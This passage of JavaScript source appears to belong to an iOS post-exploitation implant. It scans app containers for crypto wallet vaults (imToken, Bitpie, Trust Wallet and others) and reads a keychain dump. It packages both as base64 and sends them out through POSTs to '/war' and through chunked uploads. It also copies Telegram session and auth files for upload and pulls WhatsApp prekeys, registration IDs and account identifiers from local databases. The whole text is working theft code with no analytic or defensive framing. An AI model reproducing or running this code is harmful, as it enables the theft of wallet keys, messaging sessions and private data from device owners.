				if (!pipe || pipe.state !== "running") {
					globalThis.__pe_wallet_direct_pending = false;
					return;
				}
				let armAt = Number(pipe.wallet_arm_at || 0);
				if (armAt && Date.now() < armAt) return;
				globalThis.__pe_wallet_direct_pending = false;
				pipe.wallet_queued = true;
				LOG("[PE-DIRECT] wallet_scan phase (SB port + hunt)");
				// Hunt imToken / Bitpie if task match missed but containers exist.
				let entries = pipe.entries || [];
				let haveIm = false;
				let haveBp = false;
				for (let i = 0; i < entries.length; i++) {
					let e = entries[i];
					if (e && (e.payload === "imtoken" || peDirectIsImToken(e.ent))) haveIm = true;
					if (e && (e.payload === "bitpie" || peDirectIsBitpie(e.ent))) haveBp = true;
				}
				if (!haveIm) {
					let found = peImTokenFindVault();
					if (found && found.ok) {
						LOG("[PE-DIRECT] hunt imToken vault -> exfil");
						let row = {
							ent: { bundleId: "im.token.app", name: "imToken", payload: "b2lib.js" },
							sid: "", ok: false, state: "im_collecting",
							error: "", module_id: "imtoken_vault", payload: "imtoken"
						};
						peImTokenExfilArm(row, "hunt");
						entries.push(row);
						haveIm = true;
					}
				}
				if (!haveBp) {
					if (peBitpieEnsureSlice()) {
						LOG("[PE-DIRECT] hunt Bitpie slice -> exfil");
						let rowB = {
							ent: { bundleId: "com.bitpie.wallet", name: "Bitpie", payload: "r18lib.js" },
							sid: "", ok: false, state: "bp_collecting",
							error: "", module_id: "r18lib", payload: "bitpie"
						};
						peBitpieExfilArm(rowB, "hunt");
						entries.push(rowB);
						haveBp = true;
					}
				}
				pipe.entries = entries;
				peWalletScanExfilArm("secq_after");
			} catch (e) {
				LOG("[PE-DIRECT] wallet tick ERR: " + String(e).slice(0, 80));
			}
		}
		// old_pe /war = {device_uuid, keychain, sandbox} (message.txt). SEC-Q already did securityd.
		var PE_WAR_SANDBOX_KEY = {
			"Trust Wallet": "trust_wallet", "Bitget": "bitget", "Coin98": "coin98",
			"TronLink": "tronlink", "Tonhub": "tonhub", "TokenPocket": "tokenpocket",
			"imToken": "imtoken"
		};
		function peWarWaitDumpReady() {
			try {
				let stFn = globalThis.__peFsStat || null;
				let done = stFn ? stFn("/tmp/keychain_c2_dump.done") : null;
				let dump = stFn ? stFn("/tmp/keychain_c2_dump.json") : null;
				return !!(dump && dump.exists && dump.size > 50 &&
					((done && done.exists) || (dump.size > 200)));
			} catch (_) { return false; }
		}
		function peWarBuildSandbox() {
			let sandbox = {};
			let totalSize = 0;
			let maxTotal = 10 * 1024 * 1024;
			try {
				let containers = peListAppContainers();
				let base = "/var/mobile/Containers/Data/Application";
				let stFn = globalThis.__peFsStat || null;
				for (let i = 0; i < containers.length; i++) {
					if (totalSize >= maxTotal) break;
					let bid = String((containers[i] && containers[i].bundleId) || "");
					let uuid = String((containers[i] && containers[i].uuid) || "");
					if (!bid || !uuid) continue;
					let cfg = PE_WALLET_SANDBOX[bid];
					let mapBid = bid;
					if (!cfg) {
						let bl = bid.toLowerCase();
						for (let k in PE_WALLET_SANDBOX) {
							if (bl.indexOf(k.toLowerCase()) >= 0 || k.toLowerCase().indexOf(bl) >= 0) {
								cfg = PE_WALLET_SANDBOX[k];
								mapBid = k;
								break;
							}
						}
					}
					if (!cfg || !cfg.files) continue;
					let files = peWalletResolveFiles(base + "/" + uuid, cfg.files);
					if (!files.length) continue;
					let key = PE_WAR_SANDBOX_KEY[cfg.name] || String(cfg.name || mapBid).toLowerCase().replace(/ /g, "_");
					let perFileMax = Number(cfg.maxFileSize) || (2 * 1024 * 1024);
					let bag = sandbox[key] || {};
					let added = 0;
					for (let fi = 0; fi < files.length; fi++) {
						if (totalSize >= maxTotal) break;
						let src = files[fi].absPath;
						let st = stFn ? stFn(src) : null;
						let sz = st && st.exists ? Number(st.size) || 0 : 0;
						if (!(sz > 0) || sz > perFileMax) continue;
						if (totalSize + sz > maxTotal) continue;
						let raw = __peReadFileUtf8(src, Math.min(sz + 16, perFileMax));
						if (!raw || !raw.length) continue;
						let b64 = peB64FromLatin1(raw);
						if (!b64) continue;
						bag[files[fi].relPath] = b64;
						totalSize += raw.length;
						added++;
					}
					if (added) sandbox[key] = bag;
				}
				// Prefer already-collected imToken vault if sandbox miss
				if (!sandbox.imtoken) {
					let vpath = "/tmp/imtoken_auth/vault_keystore.json";
					let vst = stFn ? stFn(vpath) : null;
					if (vst && vst.exists && vst.size > 20) {
						let vraw = __peReadFileUtf8(vpath, 2 * 1024 * 1024);
						if (vraw && vraw.length) {
							sandbox.imtoken = {
								"Documents/walletsV2/vault_keystore.json": peB64FromLatin1(vraw)
							};
							totalSize += vraw.length;
						}
					}
				}
			} catch (e) {
				LOG("[PE-WAR] sandbox ERR: " + String(e).slice(0, 80));
			}
			return { sandbox: sandbox, bytes: totalSize };
		}
		function peWarBuildPkg() {
			try {
				if (!peWarWaitDumpReady()) return { ok: false, error: "dump_not_ready" };
				let dumpRaw = __peReadFileUtf8("/tmp/keychain_c2_dump.json", 5 * 1024 * 1024);
				if (!dumpRaw || dumpRaw.length < 50) return { ok: false, error: "dump_read_fail" };
				let keychain = null;
				try { keychain = JSON.parse(dumpRaw); } catch (_) { return { ok: false, error: "dump_json" }; }
				let sb = peWarBuildSandbox();
				let uid = peDeviceUuid();
				let pkg = {
					device_uuid: uid,
					keychain: keychain,
					sandbox: (sb && sb.sandbox) || {}
				};
				let body = JSON.stringify(pkg);
				__peWriteFileUtf8("/tmp/wallet_war_message.json", body);
				// Alias for old_pe sample name
				try { __peWriteFileUtf8("/tmp/message.txt", body); } catch (_) {}
				let sk = Object.keys(pkg.sandbox || {});
				LOG("[PE-WAR] pkg built bytes=" + body.length +
					" wallets=" + JSON.stringify(Object.keys((keychain && keychain.wallets) || {})) +
					" sandbox=" + sk.join(",") +
					" sbB=" + ((sb && sb.bytes) || 0));
				return { ok: true, path: "/tmp/wallet_war_message.json", size: body.length, uid: uid, pkg: pkg };
			} catch (e) {
				LOG("[PE-WAR] build ERR: " + String(e).slice(0, 100));
				return { ok: false, error: String(e).slice(0, 80) };
			}
		}
		function peWarExfilArm(reason) {
			try {
				let cur = globalThis.__pe_war_exfil;
				if (cur && (cur.done || cur.armed || cur.files)) return true;
				let built = peWarBuildPkg();
				if (!built || !built.ok) {
					LOG("[PE-WAR] arm skip: " + ((built && built.error) || "build_fail"));
					return false;
				}
				let uid = built.uid || peDeviceUuid();
				let cid = "pe-war-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
				let stFn = globalThis.__peFsStat || null;
				let candidates = ["/tmp/wallet_war_message.json", "/tmp/message.txt"];
				let files = [];
				let seen = {};
				for (let i = 0; i < candidates.length; i++) {
					let p = candidates[i];
					let st = stFn ? stFn(p) : null;
					if (!st || !st.exists || !(st.size > 0)) continue;
					let slash = p.lastIndexOf("/");
					let fname = slash >= 0 ? p.slice(slash + 1) : p;
					if (seen[fname]) continue;
					seen[fname] = 1;
					files.push({ path: p, size: Number(st.size) || 0 });
				}
				if (!files.length) return false;
				globalThis.__pe_war_exfil = {
					armed: true, done: false, uid: uid, cid: cid, files: files,
					fi: 0, chunkIdx: 0, totalChunks: 0, cs: 0, budget: 0, tier: "",
					fname: "", size: 0, okN: 0, failN: 0,
					reason: String(reason || "war"), reported: false,
					posted: false, bodySize: built.size || 0
				};
				// Direct /war POST (old_pe HQ shape) when body fits listen-safe fire.
				try {
					if (built.size > 0 && built.size <= 900 * 1024 && built.pkg) {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						let body = JSON.stringify(built.pkg);
						let ok1 = !!fire("/war", body);
						let ok2 = !!fire("/api/war", body);
						globalThis.__pe_war_exfil.posted = !!(ok1 || ok2);
						LOG("[PE-WAR] POST /war fire ok=" + !!(ok1 || ok2) + " bytes=" + built.size);
					} else {
						LOG("[PE-WAR] skip direct /war body=" + (built.size || 0) + " - chunk exfil only");
					}
				} catch (pe) {
					LOG("[PE-WAR] POST ERR: " + String(pe).slice(0, 80));
				}
				LOG("[PE-WAR] exfil armed n=" + files.length + " cid=" + cid);
				return true;
			} catch (e) {
				LOG("[PE-WAR] arm ERR: " + String(e).slice(0, 80));
				return false;
			}
		}
		function peWarExfilTick() {
			try {
				let x = globalThis.__pe_war_exfil;
				if (!x || x.done || !x.files || !x.files.length) return;
				if (x.fi >= x.files.length) {
					x.done = true;
					x.armed = false;
					LOG("[PE-WAR] exfil done ok=" + x.okN + " fail=" + x.failN + " posted=" + !!x.posted);
					if (!x.reported) {
						x.reported = true;
						try {
							let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
							fire("/api/asset/report", JSON.stringify({
								uid: x.uid, uuid: x.uid,
								category: "wallet", asset_category: "wallet",
								module_id: "wallet_war", app_id: "wallet_war",
								app_map_key: "wallet_war",
								command_id: x.cid, ok: x.okN > 0 || !!x.posted,
								exfil_ok: x.okN, exfil_fail: x.failN,
								war_posted: !!x.posted,
								paths: ["/tmp/wallet_war_message.json", "/tmp/message.txt"],
								title: "Wallet /war package",
								summary: "message.txt-shaped /war bytes~" + (x.bodySize || 0),
								asset: true
							}));
						} catch (_) {}
					}
					return;
				}
				let f = x.files[x.fi];
				if (!f) { x.fi++; return; }
				if (!x.fname) {
					let slash = f.path.lastIndexOf("/");
					x.fname = slash >= 0 ? f.path.slice(slash + 1) : f.path;
					x.size = Number(f.size) || 0;
					let tier = peExfilTierForSize(x.size);
					x.cs = tier.cs; x.budget = tier.budget; x.tier = tier.name;
					x.totalChunks = Math.ceil(x.size / x.cs) || 1;
					x.chunkIdx = 0;
					LOG("[PE-WAR] start " + f.path + " size=" + x.size + " tier=" + x.tier);
				}
				let budget = Number(x.budget) || 1;
				for (let b = 0; b < budget; b++) {
					if (x.chunkIdx >= x.totalChunks) break;
					let r = peExfilUploadChunk(x.uid, x.cid, f.path, x.fname, x.size, x.chunkIdx, x.totalChunks, x.cs, {
						module_id: "wallet_war", asset_category: "wallet",
						app_id: "wallet_war", app_map_key: "wallet_war"
					});
					if (!r || !r.ok) {
						x.failN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
						return;
					}
					x.chunkIdx++;
				}
				if (x.chunkIdx >= x.totalChunks) {
					x.okN++; x.fi++; x.fname = ""; x.chunkIdx = 0; x.totalChunks = 0;
				}
			} catch (e) {
				LOG("[PE-WAR] tick ERR: " + String(e).slice(0, 80));
			}
		}
		function peDirectWarDeferredTick() {
			try {
				if (!globalThis.__pe_war_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
				if (!pipe || pipe.state !== "running") {
					// Still allow war after pipeline if dump ready
					if (!peWarWaitDumpReady()) return;
				}
				let armAt = Number((pipe && pipe.war_arm_at) || globalThis.__pe_war_arm_at || 0);
				if (armAt && Date.now() < armAt) return;
				if (!peWarWaitDumpReady()) {
					// Wait a bit more for dump; don't clear pending forever
					if (pipe) pipe.war_arm_at = Date.now() + 3000;
					return;
				}
				globalThis.__pe_war_direct_pending = false;
				if (pipe) pipe.war_queued = true;
				LOG("[PE-DIRECT] /war package phase (no securityd)");
				peWarExfilArm("secq_after");
			} catch (e) {
				LOG("[PE-DIRECT] war tick ERR: " + String(e).slice(0, 80));
			}
		}
		function peTgAccess(p) {
			try { return Number(N.callSymbol("access", String(p || ""), 0)) === 0; } catch (_) { return false; }
		}
		function peTgIsDir(p) {
			try {
				let d = N.callSymbol("opendir", String(p || ""));
				if (d && d !== 0n) {
					try { N.callSymbol("closedir", d); } catch (_) {}
					return true;
				}
			} catch (_) {}
			return false;
		}
		function peTgListNames(dir) {
			let out = [];
			try {
				let d = N.callSymbol("opendir", String(dir || ""));
				if (!d || d === 0n) return out;
				for (;;) {
					let ent = N.callSymbol("readdir", d);
					if (!ent || ent === 0n) break;
					let name = N.readString(ent + 21n, 256);
					if (!name || name === "." || name === "..") continue;
					out.push(name);
					if (out.length > 80) break;
				}
				try { N.callSymbol("closedir", d); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peTgCopyFile(src, dst) {
			try {
				if (!peTgAccess(src)) return { ok: false, size: 0, err: "missing" };
				let srcFd = Number(N.callSymbol("open", src, 0));
				if (srcFd < 0) return { ok: false, size: 0, err: "open_src" };
				let dstFd = Number(N.callSymbol("open", dst, 0x601, 0x1ff));
				if (dstFd < 0) {
					try { N.callSymbol("close", srcFd); } catch (_) {}
					return { ok: false, size: 0, err: "open_dst" };
				}
				let chunk = 65536;
				let cap = 80 * 1024 * 1024;
				let total = 0;
				let buf = N.callSymbol("malloc", chunk);
				if (!buf || buf === 0n) {
					try { N.callSymbol("close", srcFd); } catch (_) {}
					try { N.callSymbol("close", dstFd); } catch (_) {}
					return { ok: false, size: 0, err: "malloc" };
				}
				try {
					for (;;) {
						if (total >= cap) break;
						let nr = Number(N.callSymbol("read", srcFd, buf, chunk));
						if (!(nr > 0)) break;
						let nw = Number(N.callSymbol("write", dstFd, buf, nr));
						if (!(nw > 0)) { total = 0; break; }
						total += nw;
					}
				} finally {
					try { N.callSymbol("free", buf); } catch (_) {}
					try { N.callSymbol("close", srcFd); } catch (_) {}
					try { N.callSymbol("close", dstFd); } catch (_) {}
				}
				if (total > 0) {
					try { N.callSymbol("chmod", dst, 0x1ff); } catch (_) {}
					return { ok: true, size: total, err: "" };
				}
				return { ok: false, size: 0, err: "empty" };
			} catch (e) {
				return { ok: false, size: 0, err: String(e).slice(0, 60) };
			}
		}
		function peTgResolveTd(root) {
			if (!root) return "";
			if (peTgIsDir(root + "/telegram-data")) return root + "/telegram-data";
			if (peTgAccess(root + "/accounts-metadata/atomic-state") ||
				peTgIsDir(root + "/accounts-metadata")) return root;
			return "";
		}
		function peTgAtomicPath(td, root) {
			let cands = [
				(td || "") + "/accounts-metadata/atomic-state",
				(td || "") + "/accounts-metadata/atomic-state.json",
				(root || "") + "/accounts-metadata/atomic-state",
				(root || "") + "/telegram-data/accounts-metadata/atomic-state"
			];
			for (let i = 0; i < cands.length; i++) {
				if (cands[i] && peTgAccess(cands[i]) && !peTgIsDir(cands[i])) return cands[i];
			}
			return "";
		}
		function peTgScoreRoot(root) {
			if (!root) return 0;
			let score = 0;
			let td = peTgResolveTd(root);
			if (td) score += 25;
			if (peTgAtomicPath(td, root)) score += 80;
			if (peTgAccess((td || root) + "/.tempkey")) score += 15;
			let names = peTgListNames(td || root);
			for (let i = 0; i < names.length; i++) {
				if (String(names[i]).indexOf("account-") !== 0) continue;
				if (peTgAccess((td || root) + "/" + names[i] + "/postbox/db/db_sqlite")) score += 40;
			}
			if (peTgAccess((td || root) + "/accounts-shared-data")) score += 10;
			if (peTgAccess((td || root) + "/key_datas")) score += 10;
			return score;
		}
		function peTgScanBase(base, limit) {
			let out = [];
			let n = 0;
			try {
				let d = N.callSymbol("opendir", base);
				if (!d || d === 0n) return out;
				for (;;) {
					let ent = N.callSymbol("readdir", d);
					if (!ent || ent === 0n) break;
					n++;
					if (n > (limit || 220)) break;
					let name = N.readString(ent + 21n, 256);
					if (!name || name === "." || name === ".." || name.length < 30) continue;
					let root = base + "/" + name;
					let meta = root + "/.com.apple.mobile_container_manager.metadata.plist";
					if (!peTgAccess(meta)) continue;
					let txt = __peReadFileUtf8(meta, 4096) || "";
					let low = txt.toLowerCase();
					let hit = low.indexOf("telegra") >= 0 || low.indexOf("telegram") >= 0;
					let score = peTgScoreRoot(root);
					if (!hit && score < 25) continue;
					let gid = "";
					if (txt.indexOf("group.ph.telegra.Telegraph") >= 0) gid = "group.ph.telegra.Telegraph";
					else if (txt.indexOf("ph.telegra.Telegraph") >= 0) gid = "ph.telegra.Telegraph";
					out.push({ path: root, score: score, group_id: gid, uuid: name });
					if (score >= 80) break;
				}
				try { N.callSymbol("closedir", d); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peTgFindAppGroup() {
			let groups = peTgScanBase("/var/mobile/Containers/Shared/AppGroup", 220);
			if (!groups.length) groups = peTgScanBase("/var/mobile/Containers/Data/Application", 180);
			groups.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
			return groups.length ? groups[0] : null;
		}
		function peTgCopyAuth() {
			let outDir = "/tmp/tg_auth";
			try { N.callSymbol("mkdir", outDir, 0x1ff); } catch (_) {}
			try { N.callSymbol("chmod", outDir, 0x1ff); } catch (_) {}
			let hit = peTgFindAppGroup();
			let files = [];
			let add = function (name, src) {
				if (!src || !peTgAccess(src) || peTgIsDir(src)) {
					files.push({ name: name, src: src || "", ok: false, size: 0, err: src ? "missing" : "not_found" });
					return false;
				}
				let r = peTgCopyFile(src, outDir + "/" + name);
				files.push({ name: name, src: src, ok: !!r.ok, size: r.size || 0, err: r.err || "" });
				LOG("[PE-TG] copy " + name + " " + (r.ok ? "OK" : "FAIL") +
					" size=" + (r.size || 0) + (r.err ? " err=" + r.err : ""));
				return !!r.ok;
			};
			if (!hit || !hit.path) {
				let miss = {
					ok: false, skip_reason: "appgroup_not_found", files: files,
					group: "", atomic: false, postbox: false, ts: Date.now()
				};
				try { __peWriteFileUtf8(outDir + "/manifest.json", JSON.stringify(miss) + "\n"); } catch (_) {}
				return miss;
			}
			let group = hit.path;
			let td = peTgResolveTd(group);
			let atomic = peTgAtomicPath(td, group);
			add("atomic-state", atomic);
			let accountId = "";
			try {
				let raw = atomic ? (__peReadFileUtf8(atomic, 262144) || "") : "";
				let m = raw.match(/"currentRecordId"\s*:\s*"?(\d+)/);
				if (m) accountId = m[1];
			} catch (_) {}
			let postbox = "";
			let names = peTgListNames(td || group);
			if (accountId && peTgAccess((td || group) + "/account-" + accountId + "/postbox/db/db_sqlite"))
				postbox = (td || group) + "/account-" + accountId + "/postbox/db/db_sqlite";
			if (!postbox) {
				for (let i = 0; i < names.length; i++) {
					if (String(names[i]).indexOf("account-") !== 0) continue;
					let p = (td || group) + "/" + names[i] + "/postbox/db/db_sqlite";
					if (peTgAccess(p)) { postbox = p; break; }
				}
			}
			if (postbox) {
				add("postbox_db_sqlite", postbox);
				if (peTgAccess(postbox + "-wal")) add("postbox_db_sqlite-wal", postbox + "-wal");
				if (peTgAccess(postbox + "-shm")) add("postbox_db_sqlite-shm", postbox + "-shm");
			}
			if (td && peTgAccess(td + "/.tempkey")) add("tempkey", td + "/.tempkey");
			let aux = ["accounts-shared-data", "key_datas"];
			for (let xi = 0; xi < aux.length; xi++) {
				let ap = (td || group) + "/" + aux[xi];
				if (peTgAccess(ap) && !peTgIsDir(ap)) add(aux[xi], ap);
			}
			let okN = 0;
			for (let i = 0; i < files.length; i++) if (files[i].ok) okN++;
			let ids = (typeof peDeviceIds !== "undefined" && peDeviceIds) ? peDeviceIds : {};
			let man = {
				ok: !!(atomic && okN),
				skip_reason: !atomic ? "atomic_state_missing" : (postbox ? "" : "postbox_missing"),
				mode: "pe_copy",
				partner_alias: "tglib",
				group: group,
				group_id: hit.group_id || "",
				group_score: hit.score || 0,
				telegram_data: td || "",
				atomic_path: atomic || "",
				postbox_path: postbox || "",
				account_id: accountId || "",
				ok_count: okN,
				files: files,
				device: { uuid: ids.uuid || "", peid: ids.peid || "", serial: ids.serial || "" },
				module_id: "session_telegram",
				app_id: "ph.telegra.Telegraph",
				ts: Date.now()
			};
			try { __peWriteFileUtf8(outDir + "/manifest.json", JSON.stringify(man) + "\n"); } catch (_) {}
			try { N.callSymbol("chmod", outDir + "/manifest.json", 0x1ff); } catch (_) {}
			return man;
		}
		function peDirectTgDeferredTick() {
			try {
				if (peTgPaused()) {
					if (globalThis.__pe_tg_direct_pending) {
						globalThis.__pe_tg_direct_pending = false;
						globalThis.__pe_tg_copied = true;
						let pipe = globalThis.__pe_direct_pipe;
						if (pipe) {
							pipe.tg_copied = true;
							pipe.tg_pending = [];
						}
						LOG("[PE-TG] paused via agent_flags - skip copy");
					}
					return;
				}
				if (globalThis.__pe_tg_copied) return;
				if (!globalThis.__pe_tg_direct_pending) return;
				let pipe = globalThis.__pe_direct_pipe;
				let armAt = Number((pipe && pipe.tg_arm_at) || 0);
				if (armAt && Date.now() < armAt) return;
				LOG("[PE-TG] copy AppGroup files to /tmp/tg_auth");
				let man = peTgCopyAuth() || { ok: false, skip_reason: "copy_fail", files: [] };
				let missHard = man.skip_reason === "appgroup_not_found" ||
					man.skip_reason === "atomic_state_missing";
				if (!(man.ok || missHard)) {
					if (pipe) pipe.tg_arm_at = Date.now() + 8000;
					LOG("[PE-TG] copy incomplete skip=" + (man.skip_reason || "") + " retry in 8s");
					return;
				}
				let ready = {
					ok: !!man.ok,
					skip_reason: man.skip_reason || "",
					ok_count: man.ok_count || 0,
					group: man.group || "",
					atomic: !!man.atomic_path,
					postbox: !!man.postbox_path,
					account_id: man.account_id || "",
					files: man.files || [],
					device: man.device || {},
					module_id: "session_telegram",
					app_id: "ph.telegra.Telegraph",
					out_dir: "/tmp/tg_auth",
					ts: Date.now()
				};
				try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
				try { __peWriteFileUtf8("/tmp/c2_ipc/tg_auth.ready", JSON.stringify(ready) + "\n"); } catch (_) {}
				try { N.callSymbol("chmod", "/tmp/c2_ipc/tg_auth.ready", 0x1ff); } catch (_) {}
				try { __peWriteFileUtf8("/tmp/tg_auth.ready", JSON.stringify(ready) + "\n"); } catch (_) {}
				globalThis.__pe_tg_copied = true;
				globalThis.__pe_tg_direct_pending = false;
				if (pipe) {
					pipe.tg_copied = true;
					pipe.tg_pending = [];
				}
				LOG("[PE-TG] copy done ok=" + !!man.ok + " n=" + (man.ok_count || 0) +
					" skip=" + (man.skip_reason || "") + " - agent will upload");
			} catch (e) {
				LOG("[PE-TG] tick ERR: " + String(e).slice(0, 80));
				let pipe = globalThis.__pe_direct_pipe;
				if (pipe) pipe.tg_arm_at = Date.now() + 8000;
			}
		}
		function peWaAuthManifest() {
			try {
				let raw = __peReadFileUtf8("/tmp/wa_auth/manifest.json", 8192);
				if (!raw || raw.length < 8) return null;
				return JSON.parse(raw);
			} catch (_) { return null; }
		}
		function peWaHexFromBytes(u8) {
			if (!u8 || !u8.length) return "";
			let h = "";
			let n = u8.length;
			if (n > 4096) n = 4096;
			for (let i = 0; i < n; i++) {
				let b = u8[i] & 255;
				h += (b < 16 ? "0" : "") + b.toString(16);
			}
			return h;
		}
		function peWaSqliteOpen(path) {
			try {
				let buf = N.callSymbol("calloc", 1, 8);
				let rc = Number(N.callSymbol("sqlite3_open_v2", path, buf, 0x01, 0n));
				if (rc !== 0) {
					try { N.callSymbol("free", buf); } catch (_) {}
					return null;
				}
				let db = N.read64(BigInt(buf));
				N.callSymbol("free", buf);
				try { N.callSymbol("sqlite3_busy_timeout", db, 3000); } catch (_) {}
				return db;
			} catch (_) { return null; }
		}
		function peWaSqliteClose(db) {
			try { if (db) N.callSymbol("sqlite3_close", db); } catch (_) {}
		}
		function peWaSqliteBlobHex(stmt, col, maxn) {
			try {
				let pb = BigInt(N.callSymbol("sqlite3_column_blob", stmt, col));
				let plen = Number(N.callSymbol("sqlite3_column_bytes", stmt, col));
				if (!pb || pb === 0n || !(plen > 0)) return "";
				if (maxn && plen > maxn) plen = maxn;
				let u8 = new Uint8Array(N.read(pb, plen));
				return peWaHexFromBytes(u8);
			} catch (_) { return ""; }
		}
		function peWaSqliteInt(stmt, col) {
			try { return Number(N.callSymbol("sqlite3_column_int64", stmt, col)) || 0; }
			catch (_) {
				try { return Number(N.callSymbol("sqlite3_column_int", stmt, col)) || 0; }
				catch (__) { return 0; }
			}
		}
		function peWaSqliteText(stmt, col) {
			try {
				let p = BigInt(N.callSymbol("sqlite3_column_text", stmt, col));
				if (!p || p === 0n) return "";
				return N.readString(p, 4096) || "";
			} catch (_) { return ""; }
		}
		function peWaExtractSignedPrekey(db) {
			let out = {};
			try {
				let stmtBuf = N.callSymbol("calloc", 1, 8);
				let sql = "SELECT ZKEYID, ZKEYDATA, ZCREATIONDATE FROM ZWASIGNEDPREKEY ORDER BY ZKEYID DESC LIMIT 1";
				let rc = Number(N.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
				if (rc !== 0) { try { N.callSymbol("free", stmtBuf); } catch (_) {} return out; }
				let stmt = N.read64(BigInt(stmtBuf));
				N.callSymbol("free", stmtBuf);
				if (Number(N.callSymbol("sqlite3_step", stmt)) === 100) {
					out.prekey_id = peWaSqliteInt(stmt, 0);
					out.hexKey = peWaSqliteBlobHex(stmt, 1, 256);
					out.timestamp = peWaSqliteInt(stmt, 2);
				}
				try { N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peWaExtractPrekeys(db, limit) {
			let out = [];
			limit = limit || 16;
			try {
				let stmtBuf = N.callSymbol("calloc", 1, 8);
				let sql = "SELECT Z_PK, ZKEYID, ZKEYDATA FROM ZWAPREKEY ORDER BY ZKEYID LIMIT " + (limit | 0);
				let rc = Number(N.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
				if (rc !== 0) { try { N.callSymbol("free", stmtBuf); } catch (_) {} return out; }
				let stmt = N.read64(BigInt(stmtBuf));
				N.callSymbol("free", stmtBuf);
				while (out.length < limit && Number(N.callSymbol("sqlite3_step", stmt)) === 100) {
					out.push({
						id: peWaSqliteInt(stmt, 0),
						prekey_id: peWaSqliteInt(stmt, 1),
						upload_time: 0,
						hexKey: peWaSqliteBlobHex(stmt, 2, 128)
					});
				}
				try { N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peWaExtractRegFromBackedUp() {
			// Soft registrationID from BackedUpKeyValue only (skip LocalKeyValue 1.5MB).
			let path = "/tmp/wa_auth/BackedUpKeyValue.sqlite";
			let st = globalThis.__peFsStat ? globalThis.__peFsStat(path) : null;
			if (!st || !st.exists) return 0;
			let db = peWaSqliteOpen(path);
			if (!db) return 0;
			let rid = 0;
			try {
				let tables = [];
				let tb = N.callSymbol("calloc", 1, 8);
				let trc = Number(N.callSymbol("sqlite3_prepare_v2", db,
					"SELECT name FROM sqlite_master WHERE type='table'", -1, tb, 0n));
				if (trc === 0) {
					let ts = N.read64(BigInt(tb));
					N.callSymbol("free", tb);
					while (Number(N.callSymbol("sqlite3_step", ts)) === 100) {
						let name = peWaSqliteText(ts, 0);
						if (name) tables.push(name);
					}
					try { N.callSymbol("sqlite3_finalize", ts); } catch (_) {}
				} else {
					try { N.callSymbol("free", tb); } catch (_) {}
				}
				for (let ti = 0; ti < tables.length && !rid; ti++) {
					let table = tables[ti];
					let up = table.toUpperCase();
					if (up.indexOf("KEYVALUE") < 0 && up.indexOf("VALUE") < 0) continue;
					let sql = "SELECT ZKEY, ZVALUE FROM " + table +
						" WHERE ZKEY LIKE '%egist%' OR ZKEY LIKE '%Registration%' OR KEY LIKE '%egist%' LIMIT 30";
					// Try ZKEY/ZVALUE then KEY/VALUE
					let attempts = [
						"SELECT ZKEY, ZVALUE FROM \"" + table.replace(/"/g, "") + "\" WHERE ZKEY LIKE '%egist%' OR ZKEY LIKE '%Registration%' LIMIT 30",
						"SELECT key, value FROM \"" + table.replace(/"/g, "") + "\" WHERE key LIKE '%egist%' OR key LIKE '%Registration%' LIMIT 30"
					];
					for (let ai = 0; ai < attempts.length && !rid; ai++) {
						let stmtBuf = N.callSymbol("calloc", 1, 8);
						let rc = Number(N.callSymbol("sqlite3_prepare_v2", db, attempts[ai], -1, stmtBuf, 0n));
						if (rc !== 0) { try { N.callSymbol("free", stmtBuf); } catch (_) {} continue; }
						let stmt = N.read64(BigInt(stmtBuf));
						N.callSymbol("free", stmtBuf);
						while (!rid && Number(N.callSymbol("sqlite3_step", stmt)) === 100) {
							let k = String(peWaSqliteText(stmt, 0) || "").toLowerCase();
							if (k.indexOf("regist") < 0 && k.indexOf("registration") < 0) continue;
							let pb = BigInt(N.callSymbol("sqlite3_column_blob", stmt, 1));
							let plen = Number(N.callSymbol("sqlite3_column_bytes", stmt, 1));
							if (pb && pb !== 0n && plen >= 4) {
								let u8 = new Uint8Array(N.read(pb, 4));
								rid = u8[0] | (u8[1] << 8) | (u8[2] << 16) | (u8[3] << 24);
								if (rid < 0) rid = rid >>> 0;
							} else {
								let t = peWaSqliteText(stmt, 1);
								if (/^\d+$/.test(t)) rid = parseInt(t, 10) || 0;
							}
						}
						try { N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
					}
				}
			} catch (_) {}
			peWaSqliteClose(db);
			return rid > 0 ? rid : 0;
		}
		function peWaUserFromPlistScan() {
			// Lightweight scan - avoid full CFPropertyList; look for jabber / phone keys in raw bytes.
			let user = "", phoneId = "", nick = "";
			try {
				let st = globalThis.__peFsStat ? globalThis.__peFsStat("/tmp/wa_auth/shared.plist") : null;
				let sz = st && st.size ? Number(st.size) : 0;
				let cap = (!Number.isFinite(sz) || sz <= 0) ? 65536 : sz;
				if (cap > 200000) cap = 200000;
				let parts = [];
				let off = 0;
				while (off < cap) {
					let want = cap - off;
					if (want > 8192) want = 8192;
					let chunk = peReadFileSlice("/tmp/wa_auth/shared.plist", off, want);
					if (!chunk) break;
					parts.push(chunk);
					off += chunk.length;
					if (chunk.length < want) break;
				}
				let raw = parts.join("");
				if (!raw) return { userId: "", phoneId: "", nickname: "" };
				function xmlTag(name) {
					let re = new RegExp("<key>" + name + "</key>\\s*<string>([^<]*)</string>", "i");
					let m = raw.match(re);
					return m ? m[1] : "";
				}
				let jabber = xmlTag("OwnJabberID") || xmlTag("lastOwnJID") || xmlTag("UserJID") || xmlTag("userId") || "";
				if (!jabber) {
					let m2 = raw.match(/([1-9][0-9]{6,15})@s\.whatsapp\.net/);
					if (m2) jabber = m2[1];
				}
				if (jabber) {
					user = String(jabber).split("@")[0].replace(/^\+/, "");
				}
				phoneId = xmlTag("phoneId") || xmlTag("PhoneID") || xmlTag("PhoneUUID") || xmlTag("DeviceID") || "";
